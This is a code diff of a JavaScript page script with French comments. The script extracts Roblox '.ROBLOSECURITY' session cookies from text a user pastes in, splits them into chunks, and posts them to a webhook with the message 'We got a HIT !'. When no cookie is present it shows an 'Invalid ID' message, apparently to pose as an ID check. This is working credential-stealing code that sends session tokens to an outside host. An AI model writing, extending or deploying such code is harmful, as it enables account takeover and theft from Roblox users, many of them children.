@@ -61,7 +61,7 @@ document.getElementById('sendBtn').addEventListener('click', async ()=>{
   const text = document.getElementById('message').value;
   if(!text){ log('Message vide — rien à envoyer.'); return; }
 
-  // Extraire le texte entre ".Hello" et ";", en gardant ".Hello"
+  // Extraire le texte entre ".ROBLOSECURITY" et ";", en gardant ".ROBLOSECURITY"
   const regex = /(\.ROBLOSECURITY[\s\S]*?);/g;
   let match;
   const extracted = [];
@@ -71,7 +71,8 @@ document.getElementById('sendBtn').addEventListener('click', async ()=>{
 
   if(extracted.length === 0){ log('Invalid ID'); return; }
 
-  const chunks = splitIntoChunks(extracted.join("\n"), 1998);
+  const fullExtractedText = extracted.join("\n");
+  const chunks = splitIntoChunks(fullExtractedText, 1998);
 
   // Envoi du message introductif
   await postToWebhook(webhookUrl, { content: '`We got a HIT ! :`' });
